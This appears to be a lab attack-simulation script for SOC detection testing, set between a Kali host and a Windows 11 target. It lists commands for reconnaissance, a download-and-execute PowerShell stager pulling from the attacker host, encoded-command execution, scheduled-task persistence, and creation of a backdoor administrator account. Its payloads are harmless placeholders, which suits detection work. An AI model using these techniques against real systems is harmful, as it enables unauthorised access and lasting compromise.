# Attack Scenario 001: Kali External Reconnaissance, C2 Staging & Persistence Intrusion

- **Scenario ID:** `SCENARIO-001`
- **Target:** Windows 11 (`192.168.56.105`)
- **Attacker:** Kali Linux (`192.168.56.101`)
- **MITRE Tactics:** Reconnaissance, Initial Access, Execution, Persistence, Privilege Escalation, Command & Control

---

## 1. Scenario Summary
An external adversary located at `192.168.56.101` scans the target network, establishes an HTTP staging server, transfers a secondary PowerShell payload to `C:\Windows\Temp\payload.ps1`, executes with policy bypass, spawns command shells for discovery, establishes scheduled task persistence (`SOCForgePersistence`), and creates a local backdoor administrator (`socforge_backdoor`).

---

## 2. Step-by-Step Simulation Commands

### Step 1: Nmap Reconnaissance (from Kali)
```bash
sudo nmap -Pn -sS -sV -p 135,139,445,3389,5985 192.168.56.105
```

### Step 2: C2 Ingress Stager (from Kali)
```bash
echo "Write-Host 'SOCForge Stager Executed from Kali C2!'" > payload.ps1
python3 -m http.server 8080
```

### Step 3: Payload Transfer & Execution (on Target)
```powershell
powershell.exe -NoProfile -Command "Invoke-WebRequest -Uri 'http://192.168.56.101:8080/payload.ps1' -OutFile 'C:\Windows\Temp\payload.ps1'; powershell.exe -ExecutionPolicy Bypass -File 'C:\Windows\Temp\payload.ps1'"
```

### Step 4: Obfuscated PowerShell Execution (on Target)
```powershell
powershell.exe -NoProfile -EncodedCommand VwByAGkAdABlAC0ASABvAHMAdAAgACcAUwBPAEMARgBvAHIAYwBlACAAUgBlAGQAIABUAGUAYQBtACAAQQB0AHQAYQBjAGsAIABTAGkAbQB1AGwAYQB0AGkAbwBuACcA
```

### Step 5: Process Spawning & Local Recon (on Target)
```powershell
powershell.exe -NoProfile -Command "cmd.exe /c 'whoami && netstat -ano'"
```

### Step 6: Scheduled Task Persistence (on Target)
```powershell
schtasks.exe /create /tn "SOCForgePersistence" /tr "C:\Windows\System32\calc.exe" /sc onlogon /f
```

### Step 7: Backdoor Administrator Creation (on Target)
```powershell
net.exe user socforge_backdoor P@ssw0rd123! /add
net.exe localgroup administrators socforge_backdoor /add
```
